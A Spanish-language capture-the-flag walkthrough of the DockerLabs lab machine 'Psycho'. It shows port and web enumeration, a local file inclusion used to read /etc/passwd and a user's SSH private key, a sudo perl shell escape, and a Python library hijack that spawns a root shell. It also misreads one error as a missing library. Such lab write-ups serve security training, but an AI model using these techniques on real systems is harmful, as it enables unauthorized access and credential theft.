#MAQUINA #DOCKERLABS #FACIL 
#LFI
#PYTHON_LIBRARY_HIJACKING
<hr>

# RECONOCIMIENTO

Vamos a resolver **Psycho** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-09 17:15 CET
Initiating ARP Ping Scan at 17:15
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 17:15, 0.03s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 17:15
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 17:15, 0.50s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2024-12-09 17:15:55 CET for 1s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** y el puerto **22(SSH)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80 172.17.0.2                            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-09 17:25 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.000024s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 38:bb:36:a4:18:60:ee:a8:d1:0a:61:97:6c:83:06:05 (ECDSA)
|_  256 a3:4e:4f:6f:76:f2:ba:50:c6:1a:54:40:95:9c:20:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: 4You
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.47 seconds



```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-09 17:26 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.0000040s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds

whatweb "http://172.17.0.2/"     
http://172.17.0.2/ [200 OK] Apache[2.4.58], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], Script, Title[4You]


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

## HTTP (80)

Al revisar la web que hay en el puerto 80, vemos con **gobuster** lo siguiente:

   ```bash

gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,js,txt,png,jpg     
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,js,txt,png,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 2596]
/assets               (Status: 301) [Size: 309] [--> http://172.17.0.2/assets/]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos que es un **.php** y abajo de la página hay un **error** como que algo no se importa bien.

Usamos **wfuzz** en busca de parámetros:
```bash
wfuzz -u "http://172.17.0.2/index.php?FUZZ=/etc/hosts" -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --hl=62
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.17.0.2/index.php?FUZZ=/etc/hosts
Total requests: 207643

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                              
=====================================================================

000004819:   200        69 L     182 W      2756 Ch     "secret"                                                                             

Total time: 0
Processed Requests: 207643
Filtered Requests: 207642
Requests/sec.: 0
```

Efectivamente, parámetro **secret**.

# EXPLOTACION

Si apuntamos a /etc/passwd :

Usuarios -> **luisillo** y **vaxei**

Si apuntamos al directorio personal de vaxei -> **/home/vaxei/.ssh/id_rsa** tenemos una clave privada de ssh

# ESCALADA PRIVILEGIOS

Vemos si el usuario tiene permisos SUDO:
   ```bash
vaxei@a78c9ed27ee3:~$ sudo -l
Matching Defaults entries for vaxei on a78c9ed27ee3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User vaxei may run the following commands on a78c9ed27ee3:
    (luisillo) NOPASSWD: /usr/bin/perl


```

Vemos **perl** con permisos SUDO :

   ```bash
vaxei@a78c9ed27ee3:~$ sudo -u luisillo perl -e 'exec "/bin/sh";'
$ whoami
luisillo

```

YA ESTAMOS COMO LUISILLO.

Vemos si el usuario tiene permisos SUDO:
   ```bash
   
$ sudo -l
Matching Defaults entries for luisillo on a78c9ed27ee3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User luisillo may run the following commands on a78c9ed27ee3:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py


```

Vemos **paw.py** con permisos SUDO  al ejecutarlo con python. Parece que no podemos hacer nada, pero al ejecutarlo:

   ```bash
luisillo@a78c9ed27ee3:/opt$ sudo /usr/bin/python3 /opt/paw.py
Ojo Aqui
Processed data: tHIS IS SOME DUMMY DATA THAT NEEDS TO BE PROCESSED.
Useless calculation result: 499999500000
Traceback (most recent call last):
  File "/opt/paw.py", line 41, in <module>
    main()
  File "/opt/paw.py", line 38, in main
    run_command()
  File "/opt/paw.py", line 30, in run_command
    subprocess.run(['echo Hello!'], check=True)
  File "/usr/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'echo Hello!'

```

Salta un error que falta la librería subprocces.py, podemos hacer cat del archivo:

   ```bash
import subprocess
import os
import sys
import time

# F
def dummy_function(data):
    result = ""
    for char in data:
        result += char.upper() if char.islower() else char.lower()
    return result

# Código para ejecutar el script
os.system("echo Ojo Aqui")

# Simulación de procesamiento de datos
def data_processing():
    data = "This is some dummy data that needs to be processed."
    processed_data = dummy_function(data)
    print(f"Processed data: {processed_data}")

# Simulación de un cálculo inútil
def perform_useless_calculation():
    result = 0
    for i in range(1000000):
        result += i
    print(f"Useless calculation result: {result}")

def run_command():
    subprocess.run(['echo Hello!'], check=True)

def main():
    # Llamadas a funciones que no afectan el resultado final
    data_processing()
    perform_useless_calculation()
    
    # Comando real que se ejecuta
    run_command()

if __name__ == "__main__":
    main()
   ```
  
Vemos que usa la función run y podemos copiar los argumentos que tiene del error. Podemos hacer un hijacking ya que python no encuentra la librería y toma como primer sitio el sitio de trabajo en este caso:
   
   ```bash
import os

def  run(*popenargs, **kwargs):

        os.execv("/bin/bash",["-p"])

```


   ```bash
luisillo@a78c9ed27ee3:/opt$ sudo /usr/bin/python3 /opt/paw.py
Ojo Aqui
Processed data: tHIS IS SOME DUMMY DATA THAT NEEDS TO BE PROCESSED.
Useless calculation result: 499999500000
root@a78c9ed27ee3:/opt# whoami
root
root@a78c9ed27ee3:/opt# 
```

**YA ESTAMOS COMO ROOT.**